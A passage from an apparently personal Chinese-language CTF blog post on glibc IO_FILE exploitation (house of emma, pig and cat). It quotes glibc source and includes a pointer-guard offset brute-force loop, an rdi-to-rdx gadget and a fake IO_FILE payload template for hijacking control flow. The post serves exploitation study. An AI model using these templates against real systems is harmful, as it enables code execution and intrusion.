class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="type">ssize_t</span> n = write_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">  <span class="keyword">if</span> (n &lt; size)</span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">off64_t</span></span><br><span class="line">_IO_cookie_seek (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek_cb = cfile-&gt;__io_functions.seek;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (seek_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> ((seek_cb == <span class="literal">NULL</span></span><br><span class="line">       || (seek_cb (cfile-&gt;__cookie, &amp;offset, dir)</span><br><span class="line">           == <span class="number">-1</span>)</span><br><span class="line">       || offset == (<span class="type">off64_t</span>) <span class="number">-1</span>)</span><br><span class="line">      ? _IO_pos_BAD : offset);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line">_IO_cookie_close (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close_cb = cfile-&gt;__io_functions.close;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (close_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (close_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> close_cb (cfile-&gt;__cookie);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里写了4个函数，其实大同小异，都调用了一个从<code>_IO_cookie_file</code>结构体的函数表中取出的函数指针，以<code>_IO_cookie_write</code>为例</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_write (FILE *fp, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write;<span class="comment">//取出函数指针</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (write_cb);<span class="comment">//指针保护</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (write_cb == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="type">ssize_t</span> n = write_cb (cfile-&gt;__cookie, buf, size);<span class="comment">//调用函数</span></span><br><span class="line">  <span class="keyword">if</span> (n &lt; size)</span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以我们只需伪造<code>_IO_cookie_file</code>结构体的函数表，就能调用任意函数。同时这里的<code>rdi</code>是可控的。如果要打getshell，可以直接构造；如果要打orw，可以利用libc中一个gadgets</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rdx, qword ptr [rdi + 8]; </span><br><span class="line">mov qword ptr [rsp], rax; </span><br><span class="line">call qword ptr [rdx + 0x20];</span><br></pre></td></tr></table></figure>

<p>完成从可控<code>rdi</code>到可控<code>rdx</code>的转换</p>
<p>此外，<code>_IO_cookie_file</code>里的函数指针不能直接伪造，因为默认开启了PTR_DEMANGLE （指针保护）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">uintptr_t</span> __pointer_chk_guard attribute_relro;</span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_MANGLE(var) \</span></span><br><span class="line"><span class="meta">  (var) = (__typeof (var)) ((uintptr_t) (var) ^ __pointer_chk_guard)</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_DEMANGLE(var) PTR_MANGLE (var)</span></span><br></pre></td></tr></table></figure>

<p><code>__pointer_chk_guard</code>存在于TLS段上，将其ROR移位0x11后再与存入的地址进行异或</p>
<p><img src="/../img/IOFILE-exploit.assets/image-20230811213323111.png" alt="image-20230811213323111"></p>
<p><code>fs[0x30]</code>的值位于与libc相邻的ld空间中，这个位置距离libc地址的偏移固定，可能与本地patchelf后不一致，可以通过爆破得到。因为偏移的变化值往往在地址末尾的第四个、第五个数（末三位不变），可编写如下脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            libc_base = <span class="number">0x1234</span></span><br><span class="line">            offset = <span class="number">0x6</span> &lt;&lt; <span class="number">20</span></span><br><span class="line">            offset += x &lt;&lt; <span class="number">16</span></span><br><span class="line">            offset += y &lt;&lt; <span class="number">12</span></span><br><span class="line">            ld_base = libc_base + offset</span><br><span class="line">            log.success(<span class="string">&quot;try offset:\t&quot;</span> + <span class="built_in">hex</span>(offset))</span><br><span class="line">            <span class="comment"># your code</span></span><br><span class="line">            sh.interactive()</span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            sh.close()</span><br></pre></td></tr></table></figure>

<p>详细题解可以看<a target="_blank" rel="noopener" href="https://deepunk42.github.io/2023/07/27/house-of-emma21%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E7%8E%B0/">另一篇博客</a></p>
<h2 id="house-of-pig"><a href="#house-of-pig" class="headerlink" title="house of pig"></a>house of pig</h2><ul>
<li><p>用于程序中只有<code>calloc</code>而没有<code>malloc</code>的情况</p>
</li>
<li><p>通常需要<strong>一次largebin attack</strong>以完成tcache stashing unlink attack的准备</p>
</li>
<li><p>需要<strong>一次tcache stashing unlink attack</strong></p>
</li>
</ul>
<p>调用虚表<code>_IO_str_jumps</code> -&gt; <code>_IO_str_overflow</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> _IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="type">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="type">char</span> *new_buf;</span><br><span class="line">          <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">          <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">          <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">          <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">            <span class="keyword">return</span> EOF;</span><br><span class="line">          new_buf = <span class="built_in">malloc</span> (new_size); <span class="comment">// 1</span></span><br><span class="line">          <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/*      __ferror(fp) = 1; */</span></span><br><span class="line">              <span class="keyword">return</span> EOF;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">if</span> (old_buf)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen); <span class="comment">// 2</span></span><br><span class="line">              <span class="built_in">free</span> (old_buf); <span class="comment">// 3</span></span><br><span class="line">              <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">              fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen); <span class="comment">// 4</span></span><br><span class="line"> </span><br><span class="line">          _IO_setb (fp, new_buf, new_buf + new_size, <span class="number">1</span>);</span><br><span class="line">          fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);</span><br><span class="line">          fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);</span><br><span class="line">          fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);</span><br><span class="line">          fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);</span><br><span class="line"> </span><br><span class="line">          fp-&gt;_IO_write_base = new_buf;</span><br><span class="line">          fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (!flush_only)</span><br><span class="line">    *fp-&gt;_IO_write_ptr++ = (<span class="type">unsigned</span> <span class="type">char</span>) c;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)</span><br><span class="line">    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;</span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_str_overflow)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>打tcache stashing没有<code>malloc</code>取不出chunk怎么办？</p>
<p>我有<code>_IO_str_overflow</code>！！！（自豪）</p>
</blockquote>
<p>这个函数中，完美达成<code>malloc</code>、<code>memcpy</code>、<code>free</code>一条龙服务</p>
<p>什么？你的版本太高打不了<code>free_hook</code>？</p>
<p>没关系，最后还有一个<code>memset</code>可以写libc中的got表</p>
<p>如果需要打orw，<code>rdx</code>也是可控的</p>
<p><img src="/../img/IOFILE-exploit.assets/image-20230811214840282.png" alt="image-20230811214840282"></p>
<p><code>&lt;+53&gt;mov rdx, QWORD PTR [rdi+0x28]</code></p>
<p><code>rdi</code>指向<code>_flags</code>，<code>rdi+0x28</code>指向<code>_IO_write_ptr</code>，可控</p>
<p>详细题解可以看<a target="_blank" rel="noopener" href="https://deepunk42.github.io/2023/07/27/xctf2021finalhouseofpig%E5%A4%8D%E7%8E%B0/">另一篇博客</a></p>
<h2 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h2><p>只需要<strong>一次</strong>任意写！</p>
<p>调用虚表<code>_IO_wfile_jumps</code>中的<code>_IO_wfile_seekoff</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">off64_t</span></span><br><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">off64_t</span> result;</span><br><span class="line">  <span class="type">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> count;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> do_ftell_wide (fp);</span><br><span class="line">  <span class="type">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base</span><br><span class="line">            == fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">               &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class="line">               == fp-&gt;_wide_data-&gt;_IO_write_ptr));</span><br><span class="line">#需要绕过was_writing的检测</span><br><span class="line">  <span class="type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">               &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">              || _IO_in_put_mode (fp));</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最终目的是调用<code>_IO_switch_to_wget_mode</code>函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">► 0x7fbbb9489d30 &lt;_IO_switch_to_wget_mode&gt;       endbr64</span><br><span class="line">  0x7fbbb9489d34 &lt;_IO_switch_to_wget_mode+4&gt;     mov    rax, qword ptr [rdi + 0xa0]</span><br><span class="line">  0x7fbbb9489d3b &lt;_IO_switch_to_wget_mode+11&gt;    push   rbx</span><br><span class="line">  0x7fbbb9489d3c &lt;_IO_switch_to_wget_mode+12&gt;    mov    rbx, rdi</span><br><span class="line">  0x7fbbb9489d3f &lt;_IO_switch_to_wget_mode+15&gt;    mov    rdx, qword ptr [rax + 0x20]</span><br><span class="line">  0x7fbbb9489d43 &lt;_IO_switch_to_wget_mode+19&gt;    cmp    rdx, qword ptr [rax + 0x18]</span><br><span class="line">  0x7fbbb9489d47 &lt;_IO_switch_to_wget_mode+23&gt;    jbe    _IO_switch_to_wget_mode+56                </span><br><span class="line">  0x7fbbb9489d49 &lt;_IO_switch_to_wget_mode+25&gt;    mov    rax, qword ptr [rax + 0xe0]</span><br><span class="line">  0x7fbbb9489d50 &lt;_IO_switch_to_wget_mode+32&gt;    mov    esi, 0xffffffff</span><br><span class="line">  0x7fbbb9489d55 &lt;_IO_switch_to_wget_mode+37&gt;    call   qword ptr [rax + 0x18]</span><br></pre></td></tr></table></figure>

<p>这里call了一个<code>rax</code>相关的地址，而<code>rax</code>由<code>rdi</code>决定</p>
<p>再说调用条件，需要满足两个</p>
<ol>
<li><p><code>was_writing == 1</code></p>
<p>即fp-&gt;<code>_wide_data</code>-&gt;<code>_IO_write_ptr</code>    &gt;  fp-&gt;<code>_wide_data</code>-&gt;<code>_IO_write_base</code></p>
<p>这里用到了前面提到的<code>_wide_data</code>跳表，可以直接伪造so easy</p>
</li>
<li><p><code>mode!=0</code></p>
<p><code>rcx</code>&#x3D;&gt;<code>mode</code></p>
<p>如果无法满足，可以再做一个FILE结构体，进入第二个结构体时就置好了，详细内容参考<a target="_blank" rel="noopener" href="https://phot0n.com/2022/09/06/%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%8EFSOP/">Photon的博客</a></p>
</li>
</ol>
<p>构造挺麻烦的，理解之后可以直接上别人的模板</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">fake_io_addr=heapbase+<span class="number">0xb00</span> # 伪造的fake_IO结构体的地址</span><br><span class="line">next_chain = <span class="number">0</span></span><br><span class="line">fake_IO_FILE=p64(rdi)         #_flags=rdi</span><br><span class="line">fake_IO_FILE+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="meta"># rcx!=0(FSOP)</span></span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0xb0</span>)#_IO_backup_base=rdx</span><br><span class="line">fake_IO_FILE +=p64(call_addr)#_IO_save_end=call addr(call setcontext/system)</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  # _chain</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0x88</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(heapbase+<span class="number">0x1000</span>)  # _lock = a writable address</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xa0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE +=p64(fake_io_addr+<span class="number">0x30</span>)#_wide_data,rax1_addr</span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xc0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">1</span>) <span class="meta">#mode=1</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xd8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libcbase+<span class="number">0x2160c0</span>+<span class="number">0x10</span>)  <span class="meta"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)  # rax2_addr</span><br></pre></td></tr></table></figure>

<p>详细题解可以看<a target="_blank" rel="noopener" href="https://deepunk42.github.io/2023/07/27/house-of-cat/">另一篇博客</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a target="_blank" rel="noopener" href="http://github.com/DeePunk42">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BA%8F"><span class="toc-number">1.</span> <span class="toc-text">序</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BE%85%E5%8A%A9%E6%89%8B%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">辅助手法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#largebin-attack"><span class="toc-number">2.1.</span> <span class="toc-text">largebin attack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tcache-poisoning"><span class="toc-number">2.2.</span> <span class="toc-text">tcache poisoning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tcache-stashing-unlink-attack"><span class="toc-number">2.3.</span> <span class="toc-text">tcache stashing unlink attack</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#IOFILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E7%BB%93%E6%9E%84"><span class="toc-number">3.</span> <span class="toc-text">IOFILE及相关结构</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#IO-FILE-PLUS"><span class="toc-number">3.1.</span> <span class="toc-text">_IO_FILE_PLUS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IO-FILE"><span class="toc-number">3.2.</span> <span class="toc-text">_IO_FILE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IO-jump-t"><span class="toc-number">3.3.</span> <span class="toc-text">_IO_jump_t</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#FSOP%E5%9F%BA%E7%A1%80"><span class="toc-number">4.</span> <span class="toc-text">FSOP基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91IO%E6%B5%81"><span class="toc-number">4.1.</span> <span class="toc-text">触发IO流</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FSOP-IO-flush-all-lockp"><span class="toc-number">4.1.1.</span> <span class="toc-text">FSOP - _IO_flush_all_lockp()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#house-of-kiwi-malloc-assert"><span class="toc-number">4.1.2.</span> <span class="toc-text">house of kiwi - __malloc_assert</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#fxprintf"><span class="toc-number">4.1.2.1.</span> <span class="toc-text">__fxprintf</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fflush"><span class="toc-number">4.1.2.2.</span> <span class="toc-text">fflush</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0FILE%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">4.2.</span> <span class="toc-text">伪造FILE结构体</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E5%8F%A4%E6%97%B6%E6%9C%9F%E7%9A%84FSOP-Glibc"><span class="toc-number">4.2.1.</span> <span class="toc-text">上古时期的FSOP(Glibc&lt;2.24)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%99%9A%E8%A1%A8%E5%81%8F%E7%A7%BB%E6%97%B6%E4%BB%A3-Glibc-2-24"><span class="toc-number">4.2.2.</span> <span class="toc-text">虚表偏移时代(Glibc&gt;&#x3D;2.24)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%B0%E6%97%B6%E4%BB%A3%E7%9A%84%E9%AB%98%E7%89%88%E6%9C%ACIOFILE%E5%88%A9%E7%94%A8"><span class="toc-number">5.</span> <span class="toc-text">新时代的高版本IOFILE利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-kiwi"><span class="toc-number">5.1.</span> <span class="toc-text">house of kiwi</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-emma"><span class="toc-number">5.2.</span> <span class="toc-text">house of emma</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-pig"><span class="toc-number">5.3.</span> <span class="toc-text">house of pig</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#house-of-cat"><span class="toc-number">5.4.</span> <span class="toc-text">house of cat</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/08/11/IOFILE-exploit/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/08/11/IOFILE-exploit/&text=IOFILE exploit"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/08/11/IOFILE-exploit/&title=IOFILE exploit"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/08/11/IOFILE-exploit/&is_video=false&description=IOFILE exploit"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=IOFILE exploit&body=Check out this article: http://example.com/2023/08/11/IOFILE-exploit/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/08/11/IOFILE-exploit/&title=IOFILE exploit"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/08/11/IOFILE-exploit/&title=IOFILE exploit"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/08/11/IOFILE-exploit/&title=IOFILE exploit"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/08/11/IOFILE-exploit/&title=IOFILE exploit"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/08/11/IOFILE-exploit/&name=IOFILE exploit&description=IOFILE阶段性学习成果汇报大会"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
